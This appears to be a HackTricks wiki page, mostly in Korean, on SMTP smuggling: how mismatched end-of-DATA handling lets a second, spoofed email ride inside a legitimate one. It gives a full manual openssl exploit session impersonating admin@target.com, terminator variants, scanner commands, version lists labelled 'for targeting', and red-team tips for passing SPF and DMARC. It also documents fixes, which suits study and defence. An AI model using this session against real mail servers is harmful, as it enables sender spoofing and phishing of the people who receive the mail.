# SMTP Smuggling

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

This type of vulnerability was [**originally discovered in this post**](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/) were it's explained that It's possible to **exploit discrepancies in how the SMTP protocol is interpreted** when finalising an email, allowing an attacker to smuggle more emails in the body of the legit one, allowing to impersonate other users of the affected domain (such as admin@outlook.com) bypassing defenses such as SPF.

### 이유

이것은 SMTP 프로토콜에서 이메일로 전송되는 **메시지의 데이터**가 사용자(공격자)에 의해 제어되며, 파서 간의 차이를 악용해 수신자에 추가 이메일을 스머글링할 수 있는 특수 제작된 데이터를 보낼 수 있기 때문입니다. 원문 게시물의 다음 예시를 보세요:

<figure><img src="../../images/image (8) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png">https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png</a></p></figcaption></figure>

### 방법

이 취약점을 악용하려면 공격자는 **Outbound SMPT server가 이를 단일 이메일로 인식하는 반면 Inbound SMTP server는 여러 이메일로 인식하는** 일부 데이터를 전송해야 합니다.

연구자들은 서로 다른 **Inboud servers가 이메일 메시지의 데이터 종료를 서로 다른 문자로 인식**한다는 점을 발견했습니다(Outbound servers는 그렇지 않음).  
예를 들어, 일반적인 데이터 종료는 `\r\n.\r`입니다. 그러나 Inbound SMTP server가 `\n.`도 허용한다면, 공격자는 단순히 이메일에 해당 시퀀스를 추가하고 **그 데이터를 이메일에 넣은 뒤 새로운 SMTP 명령들**을 시작하여 앞의 그림처럼 스머글링할 수 있습니다.

물론, 이 방법은 **Outbound SMTP server가 이 데이터도 메시지 종료로 처리하지 않을 경우**에만 작동합니다. 그렇지 않으면 Outbound가 2개의 이메일로 인식하게 되어 이 취약점이 악용되는 비동기화가 발생합니다.

잠재적 동기화 불일치 시퀀스:

- `\n.`
- `\n.\r`

또한, SPF는 우회됩니다. 예를 들어 `user@outlook.com`에서 `admin@outlook.com`을 스머글링하면, **발신자는 여전히 `outlook.com`**입니다.

---

## 공격자 체크리스트 (어떤 조건이 충족되어야 하나?)

성공적으로 두 번째 이메일을 스머글하려면 일반적으로 다음이 필요합니다:

- 전송할 수 있는 outbound 서버 A(종종 유효한 인증 정보가 필요)로, 비표준 end‑of‑DATA 시퀀스를 변경 없이 전달하는 서버. 많은 서비스가 역사적으로 `\n.\r\n` 또는 `\n.\n` 같은 변형을 전달했습니다.
- 해당 비표준 시퀀스를 end‑of‑DATA로 해석하고 이후 내용을 새로운 SMTP 명령(MAIL/RCPT/DATA...)으로 파싱하는 수신 서버 B.
- Outbound는 실제로 `DATA`로 전송해야 함 (`BDAT`이 아님). A가 CHUNKING/BDAT를 지원하면, 스머글링은 A가 DATA로 폴백할 때만 작동(예: B가 CHUNKING을 광고하지 않는 경우). 그렇지 않으면 길이 기반 BDAT가 모호성을 방지합니다.
- PIPELINING은 필수는 아니지만, 주입된 명령을 단일 TCP write에 숨겨 중간 장치들이 다시 동기화하지 못하게 하는 데 도움이 됩니다.

수신자에 따라 테스트해볼 만한 일반적인 end‑of‑DATA 변형:

- `\n.\n`
- `\n.\r\n`
- `\r.\r\n`
- `\r\n.\r` (끝에 bare CR)

참고: 실제로 작동하는 것은 “A가 전달하는 것” ∩ “B가 수용하는 것”의 교집합입니다.

---

## 수동 익스플로잇 예시 (단일 세션)

다음은 raw STARTTLS SMTP 세션을 사용한 아이디어를 보여줍니다. 첫 번째 DATA 블록 뒤에 비표준 종료자를 삽입한 후, 수신 서버가 새 메시지로 처리할 수 있는 또 다른 SMTP 대화를 넣습니다.

<details>
<summary>Manual smuggling session (STARTTLS)</summary>
```
$ openssl s_client -starttls smtp -crlf -connect smtp.example.com:587
EHLO a.example
AUTH PLAIN <base64(\0user@example.com\0password)>
MAIL FROM:<user@example.com>
RCPT TO:<victim@target.com>
DATA
From: User <user@example.com>
To: victim <victim@target.com>
Subject: legit

hello A
\n.\r\nMAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: victim <victim@target.com>
Subject: smuggled

hello B
\r\n.\r\n
```
</details>

A가 `\n.\r\n`을 포워드하고 B가 이를 end‑of‑DATA로 수용하면, 메시지 “hello B”가 `admin@target.com`으로부터 두 번째 이메일로 수락되면서 SPF( A의 IP와 정렬됨)를 통과할 수 있습니다.

Tip: 대화형으로 테스트할 때는 OpenSSL이 입력한 CRLF를 보존하도록 `-crlf`를 사용해야 합니다.

---

## Automation and scanners

- hannob/smtpsmug: 수신자가 어떤 것을 수용하는지 확인하기 위해 여러 개의 잘못된 end‑of‑DATA 시퀀스로 끝나는 메시지를 보냅니다.
- Example: `./smtpsmug -s mail.target.com -p 25 -t victim@target.com`
- The‑Login/SMTP‑Smuggling‑Tools: inbound 및 outbound 양쪽을 스캔하는 스캐너와 송신자가 어떤 시퀀스를 통과시키는지 정확히 확인할 수 있는 분석용 SMTP 서버를 제공합니다.
- Inbound quick check: `python3 smtp_smuggling_scanner.py victim@target.com`
- Outbound via a relay: `python3 smtp_smuggling_scanner.py YOUR@ANALYSIS.DOMAIN --outbound-smtp-server smtp.relay.com --port 587 --starttls --sender-address you@relay.com --username you@relay.com --password '...'
`

이 도구들은 smuggling이 실제로 동작하는 A→B 쌍을 매핑하는 데 도움을 줍니다.

---

## CHUNKING/BDAT vs DATA

- DATA는 종결자 `<CR><LF>.<CR><LF>`를 사용합니다; CR/LF가 어떻게 정규화되거나 dot‑stuffing 되는지에 대한 모호성은 desync를 초래합니다.
- CHUNKING(BDAT)는 바디를 정확한 바이트 길이로 프레이밍하므로 고전적인 smuggling을 방지합니다. 다만 송신자가 수신자가 CHUNKING을 광고하지 않아 DATA로 폴백하면 고전적 smuggling이 다시 가능해집니다.

---

## Notes on affected software and fixes (for targeting)

- Postfix: 3.9 이전에는 기본적으로 bare LF를 허용했으며; 3.5.23/3.6.13/3.7.9/3.8.4부터 관리자는 `smtpd_forbid_bare_newline`을 활성화할 수 있습니다. 현재 권장 설정은 `smtpd_forbid_bare_newline = normalize`(3.8.5+/3.7.10+/3.6.14+/3.5.24+)이며, 엄격한 RFC 적용을 원하면 `reject`로 설정하십시오.
- Exim: DATA 사용 시 혼합된 end‑of‑DATA 시퀀스에 의존하는 변종은 4.97.1(및 이후 버전)에서 수정되었습니다. 오래된 4.97/4.96은 PIPELINING/CHUNKING에 따라 취약할 수 있습니다.
- Sendmail: 8.18에서 수정되었고, 이전의 8.17.x는 일부 비표준 terminator를 수용했습니다.
- 다양한 라이브러리/서버(예: aiosmtpd 1.4.5 이전, 일부 벤더 게이트웨이, 특정 SaaS relays 등)도 유사한 문제가 있었으며; 최신 버전들은 보통 DATA를 엄격한 `<CR><LF>.<CR><LF>`만 수용합니다.

위의 스캐너들을 사용해 현재 동작을 확인하십시오; 많은 벤더가 2024–2025년 초에 기본값을 변경했습니다.

---

## Tips for red team ops

- A로는 대형의 일반적인 발신자(역사적으로는 Exchange Online, 공유 호스팅 제공자 등)를 선호하세요. 이들이 여전히 일부 비표준 EOM을 포워드하고 피해자의 SPF에 포함되어 있다면, 당신이 smuggle한 MAIL FROM은 그들의 평판을 상속받습니다.
- B의 SMTP 확장 기능을 열거하세요: PIPELINING/CHUNKING 여부는 `EHLO` 배너로 확인합니다; CHUNKING이 없으면 BDAT‑first 송신자에서 성공할 가능성이 더 높습니다. 잘못된 EOM과 결합해 수용 여부를 탐지하세요.
- 헤더를 주시하세요: smuggle된 메시지는 보통 B에서 시작하는 별도의 Received 체인을 생성합니다. MAIL FROM이 A의 IP 공간과 정렬되므로 DMARC는 종종 통과됩니다.

---

## **참고 자료**

- [https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [https://www.postfix.org/smtp-smuggling.html](https://www.postfix.org/smtp-smuggling.html)

{{#include ../../banners/hacktricks-training.md}}
